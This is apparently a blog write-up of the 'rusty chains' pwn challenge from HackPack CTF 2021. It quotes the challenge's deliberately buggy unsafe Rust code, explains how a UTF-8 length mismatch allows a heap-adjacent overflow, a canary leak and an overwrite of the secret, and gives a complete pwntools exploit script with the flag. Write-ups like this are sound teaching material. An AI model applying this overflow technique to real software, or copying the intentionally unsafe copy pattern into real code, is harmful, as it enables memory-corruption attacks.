---
title: HackPack CTF 2021 - rusty chains
author: sera
categories: pwn
layout: post
---

# rusty chains
A suprisingly subtle pwn from HackPack CTF 2021.

## Challenge
This is a given source rust challenge where the goal is to corrupt a chunk past a canary in a linked list. There is a `secret` value located after the canary, changing it to a specified value without corrupting the canary will print the flag.

The challenge implements a linked list which stores the data before its properties.

```rust
struct Node {
    data: [u8; MAX_DATA_SIZE],
    data_size: usize,
    max_data_size: usize,
    canary: usize,
    secret: usize,
    next: Option<Box<Node>>,
}
```

I think the easiest way to understand what this challenge is doing is just to look at the code; so I won't explain it all here. The canary's generation is secure. Here's what matters, the rest is just an interface to these methods:

```rust
const MAX_DATA_SIZE: usize = 1024;
const DEFAULT_SECRET: usize = 0x0123456789abcdef;
const WIN_SECRET: usize = 0xdeadbeefcafebabe;

#[repr(C)]
struct Node {
    data: [u8; MAX_DATA_SIZE],
    data_size: usize,
    max_data_size: usize,
    canary: usize,
    secret: usize,
    next: Option<Box<Node>>,
}

impl Node {
    fn new(data: &str, canary: usize) -> Result<Self, Box<dyn Error>> {
        let mut res = Self {
            data: [0; MAX_DATA_SIZE],
            data_size: 0,
            max_data_size: 0,
            canary,
            secret: DEFAULT_SECRET,
            next: None,
        };

        let data_chars = data.chars().collect::<Vec<_>>(); // <--- first bug
        // Check length ahead of time to avoid buffer overflows.
        if data_chars.len() > MAX_DATA_SIZE {
            return Err("Data too long to set".into());
        }

        let node_data_pointer: *mut u8 = res.data.as_mut_ptr();
        let data_pointer: *const u8 = data.as_bytes().as_ptr();

        res.data_size = data.len();
        res.max_data_size = MAX_DATA_SIZE;
        unsafe {
            // This is safe because we've already validated data length.
            std::ptr::copy_nonoverlapping(data_pointer, node_data_pointer, res.data_size);
        }

        Ok(res)
    }

    fn set_data(&mut self, data: &str) -> Result<(), Box<dyn Error>> {
        // Validate that passed string isn't too long to fit in this Node's
        // data array.
        if data.len() > self.max_data_size {
            return Err("Data too long to set".into());
        }

        let data_chars = data.chars().collect::<Vec<_>>(); // <--- second bug
        // This is safe because we've already validated that data_chars is short enough
        // to fit in the bounds of our array (<= max_data_size).
        unsafe {
            for i in 0..data_chars.len() {
                *self.data.get_unchecked_mut(i) = (*data_chars.get_unchecked(i)) as u8; // <--- second bug
            }
        }

        Ok(())
    }

    fn append_node(&mut self, data: &str, canary: usize) -> Result<(), Box<dyn Error>> {
        // Create new node.
        let old_next = self.next.take();

        let mut new_next = Node::new(data, canary)?;

        // Fixup next references.
        new_next.next = old_next;
        self.next = Some(Box::new(new_next));

        Ok(())
    }

    fn print(&self) -> Result<(), Box<dyn Error>> {
        for i in 0..self.data_size {
            unsafe {
                let this_byte = *self.data.get_unchecked(i);
                std::io::stdout().write_all(&[this_byte])?;
            }
        }
        println!();
    }
}
```

## The bug
There are two bugs that are needed to solve this challenge. The first is that the constructor uses the character count to determine the input length; but then copies the raw bytes. These numbers are not the same when the input contains multibyte characters, and using them allows for a buffer overflow.

However, we cannot overflow the secret because we don't know the canary.

The other bug is `set_data` copies the data by casting each *character* as a u8. In the case of multibyte characters, the least significant byte of the code point will be used. Unfortunately the data size >= the character count, so we can't do any overflows here directly.

## Exploitation
We will use the first bug to overflow the data size and max data size of the node. Overflowing the data size will allow us to leak the canary since the print function uses it to determine how many characters to print.

It might seem that the second bug is unneccessary if we can leak the canary with the first, since we could just make a second node using the canary we just found. However, Rust strings can only contain valid UTF-8 data - the secret is not that.

Overflowing the max data size lets us perform out of bounds writes using `set_data`. Since it uses the least significant byte of the *character point*, we can construct valid UTF-8 characters that become arbitrary data!

We can now just use this to overwrite the secret with the win value and get the flag.

flag: `flag{h0p3_y0u_g0T_uR_t3t4Nus_sh0t}`

## Code
```python
from pwn import *

def enc(string): # Construct a UTF-8 string that has our input as char points
    b = ""
    for c in string:
        b += (b"\\u04%2x" % c).replace(b" ", b"0").decode("unicode_escape")
        # Sorry!
    print(string, b)
    return b

r = remote("ctf2021.hackpack.club", 10995)

r.sendlineafter(": ", "5")
r.sendlineafter(": ", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa❤❤❤❤❤!\x00\x00\x00\x00\x00\x00❤")
# Overflow data size and max data size
r.sendlineafter(": ", "6")
r.sendlineafter(": ", "3") # leak canary

s = r.recvuntil(": ")
canary = s[1041:1049]

r.sendline("2")
# Corrupt chunk with set_data
r.sendlineafter(": ", "a" * (1024+16) + enc(canary) + enc(p64(0xdeadbeefcafebabe)))

r.interactive()
```